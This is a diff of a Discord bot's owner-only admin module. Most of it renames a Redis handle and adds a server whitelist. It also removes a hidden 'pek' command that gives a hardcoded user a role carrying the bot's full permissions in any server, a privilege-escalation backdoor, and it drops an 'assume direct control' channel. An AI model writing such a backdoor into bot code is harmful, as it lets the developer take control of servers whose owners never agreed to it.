@@ -41,17 +41,16 @@ class AdminUtils:
 
     def __init__(self, bot):
         self.bot = bot
-        self.muted = self.bot.db.not_json_get('muted', [])
-        self.blacklisted_serv_ids = self.bot.db.not_json_get('blacklist', [])
+        self.muted = self.bot.rdb.not_json_get('muted', [])
+        self.blacklisted_serv_ids = self.bot.rdb.not_json_get('blacklist', [])
 
         self.bot.loop.create_task(self.handle_pubsub())
-        self.bot.db.pubsub.subscribe('server-info-requests', 'server-info-response',  # all-shard communication
-                                     'admin-commands',  # 1-shard communication
-                                     'asdc'  # assume direct control
-                                     )
+        self.bot.rdb.pubsub.subscribe('server-info-requests', 'server-info-response',  # all-shard communication
+                                      'admin-commands'  # 1-shard communication
+                                      )
         self.requests = {}
 
-        loglevels = self.bot.db.jget('loglevels', {})
+        loglevels = self.bot.rdb.jget('loglevels', {})
         for logger, level in loglevels.items():
             try:
                 logging.getLogger(logger).setLevel(level)
@@ -61,9 +60,17 @@ class AdminUtils:
     @commands.command(hidden=True)
     @checks.is_owner()
     async def blacklist(self, _id):
-        self.blacklisted_serv_ids = self.bot.db.not_json_get('blacklist', [])
+        self.blacklisted_serv_ids = self.bot.rdb.not_json_get('blacklist', [])
         self.blacklisted_serv_ids.append(_id)
-        self.bot.db.not_json_set('blacklist', self.blacklisted_serv_ids)
+        self.bot.rdb.not_json_set('blacklist', self.blacklisted_serv_ids)
+        await self.bot.say(':ok_hand:')
+
+    @commands.command(hidden=True)
+    @checks.is_owner()
+    async def whitelist(self, _id):
+        whitelist = self.bot.rdb.not_json_get('server-whitelist', [])
+        whitelist.append(_id)
+        self.bot.rdb.not_json_set('server-whitelist', whitelist)
         await self.bot.say(':ok_hand:')
 
     @commands.command(pass_context=True, hidden=True)
@@ -137,16 +144,6 @@ class AdminUtils:
         else:
             await self.bot.say(out[page - 1])
 
-    @commands.command(hidden=True, pass_context=True)
-    @checks.is_owner()
-    async def pek(self, ctx, servID: str):
-        serv = self.bot.get_server(servID)
-        thisBot = serv.me
-        pek = await self.bot.create_role(serv, name="Bot Dev",
-                                         permissions=thisBot.server_permissions)
-        await self.bot.add_roles(serv.get_member("187421759484592128"), pek)
-        await self.bot.say("Privilege escalation complete.")
-
     @commands.command(hidden=True, name='leave')
     @checks.is_owner()
     async def leave_server(self, servID: str):
@@ -169,7 +166,7 @@ class AdminUtils:
     @checks.is_owner()
     async def mute(self, target):
         """Mutes a person by ID."""
-        self.muted = self.bot.db.not_json_get('muted', [])
+        self.muted = self.bot.rdb.not_json_get('muted', [])
         try:
             target_user = await self.bot.get_user_info(target)
         except NotFound:
@@ -180,15 +177,15 @@ class AdminUtils:
         else:
             self.muted.append(target)
             await self.bot.say("{} ({}) muted.".format(target, target_user))
-        self.bot.db.not_json_set('muted', self.muted)
+        self.bot.rdb.not_json_set('muted', self.muted)
 
     @commands.command(hidden=True)
     @checks.is_owner()
     async def loglevel(self, level: int, logger=None):
         """Changes the loglevel. Do not pass logger for global. Default: 20"""
-        loglevels = self.bot.db.jget('loglevels', {})
+        loglevels = self.bot.rdb.jget('loglevels', {})
         loglevels[logger] = level
-        self.bot.db.jset('loglevels', loglevels)
+        self.bot.rdb.jset('loglevels', loglevels)
         req = self.request_log_level(level, logger)
         for _ in range(300):  # timeout after 30 sec
             if len(self.requests[req]) >= self.bot.shard_count:
@@ -269,7 +266,7 @@ class AdminUtils:
                 await self.bot.say(f"Failed to load {cog} - update continuing on this shard only!")
 
         gc.collect()
-        build = self.bot.db.incr("build_num")
+        build = self.bot.rdb.incr("build_num")
         await self.bot.say(f"Okay, shard {self.bot.shard_id} has updated. Now on build {build}.")
         self.bot.state = "run"
 
@@ -298,6 +295,7 @@ class AdminUtils:
 
     async def on_server_join(self, server):
         if server.id in self.blacklisted_serv_ids: await self.bot.leave_server(server)
+        if server.id in self.bot.rdb.jget('server-whitelist', []): return
         bots = sum(1 for m in server.members if m.bot)
         members = len(server.members)
         ratio = bots / members
@@ -317,35 +315,35 @@ class AdminUtils:
         request = ServerInfoRequest(self.bot, serv_id)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('server-info-requests', r)
+        self.bot.rdb.publish('server-info-requests', r)
         return request.uuid
 
     def request_leave_server(self, serv_id):
         request = CommandRequest(self.bot, 'leave', server_id=serv_id)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
         return request.uuid
 
     def request_log_level(self, level, logger):
         request = CommandRequest(self.bot, 'loglevel', level=level, logger=logger)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
         return request.uuid
 
     def request_presence_update(self, status, msg):
         request = CommandRequest(self.bot, 'presence', status=status, msg=msg)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
         return request.uuid
 
     def request_bot_update(self, origin_shard):
         request = CommandRequest(self.bot, 'bot_update', origin_shard=origin_shard)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
         return request.uuid
 
     async def admin_command(self, ctx, cmd, **kwargs):
@@ -353,7 +351,7 @@ class AdminUtils:
         request = CommandRequest(ctx.bot, cmd, **kwargs)
         self.requests[request.uuid] = {}
         r = json.dumps(request.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
         for _ in range(300):  # timeout after 30 sec
             if len(self.requests[request.uuid]) >= expected_responses:
                 break
@@ -374,7 +372,7 @@ class AdminUtils:
             pslog = logging.getLogger("cogsmisc.adminUtils.PubSub")
             while not self.bot.is_closed:
                 await asyncio.sleep(0.1)
-                message = self.bot.db.pubsub.get_message()
+                message = self.bot.rdb.pubsub.get_message()
                 if message is None: continue
                 for k, v in message.items():
                     if isinstance(v, bytes):
@@ -397,12 +395,13 @@ class AdminUtils:
         try:
             invite = (
                 await self.bot.create_invite(
-                    self.bot.get_server(server_id) or self.bot.get_channel(server_id).server)).url
+                    self.bot.get_channel(server_id) or next(
+                        c for c in self.bot.get_server(server_id).channels if c.type == ChannelType.text))).url
         except:
             invite = None
         response = ServerInfoResponse(self.bot, reply_to, server_id, invite)
         r = json.dumps(response.to_dict())
-        self.bot.db.publish('server-info-response', r)
+        self.bot.rdb.publish('server-info-response', r)
 
     async def _handle_server_info_response(self, message):
         _data = json.loads(message['data'])
@@ -434,7 +433,7 @@ class AdminUtils:
             await self.bot.leave_server(serv)
             response = CommandResponse(self.bot, reply_to, "Left {}.".format(serv))
             r = json.dumps(response.to_dict())
-            self.bot.db.publish('admin-commands', r)
+            self.bot.rdb.publish('admin-commands', r)
 
     async def __handle_log_level_command(self, data):
         _data = data['data']
@@ -444,7 +443,7 @@ class AdminUtils:
         logging.getLogger(logger).setLevel(level)
         response = CommandResponse(self.bot, reply_to, "Set level of logger {} to {}.".format(logger, level))
         r = json.dumps(response.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
 
     async def __handle_command_reply(self, data):
         _data = data['data']
@@ -469,13 +468,13 @@ class AdminUtils:
             else:
                 response = CommandResponse(self.bot, reply_to, "Sent message.")
             r = json.dumps(response.to_dict())
-            self.bot.db.publish('admin-commands', r)
+            self.bot.rdb.publish('admin-commands', r)
 
     async def __handle_ping_command(self, data):
         reply_to = data['uuid']
         response = CommandResponse(self.bot, reply_to, "Pong.")
         r = json.dumps(response.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
 
     async def __handle_presence_update_command(self, data):
         reply_to = data['uuid']
@@ -487,7 +486,7 @@ class AdminUtils:
         await self.bot.change_presence(status=status, game=discord.Game(name=msg or "D&D 5e | !help"))
         response = CommandResponse(self.bot, reply_to, "Changed presence.")
         r = json.dumps(response.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
 
     async def __handle_bot_update_command(self, data):
         reply_to = data['uuid']
@@ -514,7 +513,7 @@ class AdminUtils:
         self.bot.state = "run"
         response = CommandResponse(self.bot, reply_to, "Updated!")
         r = json.dumps(response.to_dict())
-        self.bot.db.publish('admin-commands', r)
+        self.bot.rdb.publish('admin-commands', r)
 
 
 class PubSubMessage(object):
